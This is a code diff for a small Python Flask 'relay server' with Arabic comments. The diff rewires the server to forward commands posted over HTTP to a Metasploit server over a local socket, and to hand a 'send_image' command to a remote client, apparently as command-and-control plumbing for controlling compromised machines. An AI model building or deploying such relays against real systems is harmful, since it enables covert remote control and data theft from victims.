@@ -1,40 +1,47 @@
 from flask import Flask, request, jsonify
+import socket
+import os
 
 app = Flask(__name__)
 
-# تخزين الرسائل
-server_to_client = []
-client_to_server = []
+# إعداد الاتصال عبر Socket مع سيرفر Metasploit
+HOST = '127.0.0.1'  # عنوان السيرفر الفعلي أو IP العميل
+PORT = 12345  # نفس المنفذ الذي يعمل عليه سيرفر Metasploit
+
+def socket_server_connection(command):
+    """الاتصال مع سيرفر Metasploit عبر Socket"""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((HOST, PORT))
+            s.sendall(command.encode())  # إرسال الأمر
+            data = s.recv(1024)  # استلام الرد
+            return data.decode()
+    except Exception as e:
+        return f"خطأ في الاتصال: {e}"
 
 @app.route('/')
 def index():
-    return 'Relay Server is Running'
+    return 'Relay Server is Running!'
 
 @app.route('/send_to_client', methods=['POST'])
 def send_to_client():
+    """استقبال أوامر من Metasploit عبر HTTP"""
     data = request.json
-    server_to_client.append(data)
-    return jsonify({"status": "Command received"})
+    command = data.get('command', '')
+    
+    # إرسال الأمر إلى العميل عبر socket أو مباشرة
+    response = socket_server_connection(command)
+    
+    return jsonify({"status": "Command received", "response": response})
 
 @app.route('/get_from_client', methods=['GET'])
 def get_from_client():
-    if server_to_client:
-        return jsonify(server_to_client.pop(0))
-    else:
-        return jsonify({})
+    """إرسال أمر إلى العميل (مثل إرسال صورة)"""
+    command = {"command": "send_image"}  # مثال لأمر
+    return jsonify(command)
 
-@app.route('/send_to_server', methods=['POST'])
-def send_to_server():
-    data = request.json
-    client_to_server.append(data)
-    return jsonify({"status": "Output received"})
-
-@app.route('/get_from_server', methods=['GET'])
-def get_from_server():
-    if client_to_server:
-        return jsonify(client_to_server.pop(0))
-    else:
-        return jsonify({})
-    
 if __name__ == '__main__':
+    # تأكد من أن المجلد الذي يحتوي على الملفات موجود
+    if not os.path.exists("uploaded_files"):
+        os.makedirs("uploaded_files")
     app.run(host='0.0.0.0', port=10000)
